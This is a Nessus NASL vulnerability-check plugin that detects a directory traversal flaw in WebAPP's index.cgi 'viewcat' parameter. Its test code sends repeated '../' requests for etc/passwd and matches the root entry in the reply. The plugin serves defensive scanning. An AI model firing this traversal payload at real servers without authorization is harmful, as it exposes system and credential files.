#
# (C) Tenable Network Security
#

if(description)
{
 script_id(14365);
 script_cve_id("CVE-2004-1742");
 script_bugtraq_id(11028);
 script_version("$Revision: 1.5 $");
 
 name["english"] = "WebAPP Directory Traversal";

 script_name(english:name["english"]);
 
 desc["english"] = "
Synopsis :

The remote web server contains a CGI script that is susceptible to
directory traversal attacks. 

Description :

There is a flaw in the remote version of WebApp fails to filter
directory traversal sequences from the 'viewcat' parameter of the
'index.cgi' script.  An unauthenticated attacker can leverage this
issue to read arbitrary files on the remote host with the privileges
of the web server process. 

See also :

http://marc.theaimsgroup.com/?l=bugtraq&m=109336268002879&w=2
http://cornerstone.web-app.org/cgi-bin/index.cgi?action=downloads&cat=updates

Solution : 

Apply the fix provided by the vendor.

Risk factor: 

Low / CVSS Base Score : 2 
(AV:R/AC:L/Au:NR/C:P/A:N/I:N/B:N)";

 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for a directory traversal bug in WebAPP";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2004-2006 Tenable Network Security");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("webapp_detect.nasl");
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/webapp"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Try to exploit the vulnerability.
  i = 0;
  file = "etc/passwd";
  # nb: the exact installation directory can vary so we iterate a few 
  #     times, prepending "../" to the filename each time.
  while (++i < 10) {
    file = string("../", file);
    req = http_get(
      item:string(
        dir, "/index.cgi?",
        "action=topics&",
        "viewcat=", file
      ),
      port:port
    );
    r = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if( r == NULL )exit(0);
    if( egrep(pattern:"root:.*:0:[01]:", string:r) ) {
      security_note(port);
      exit(0);
    }
  }
}
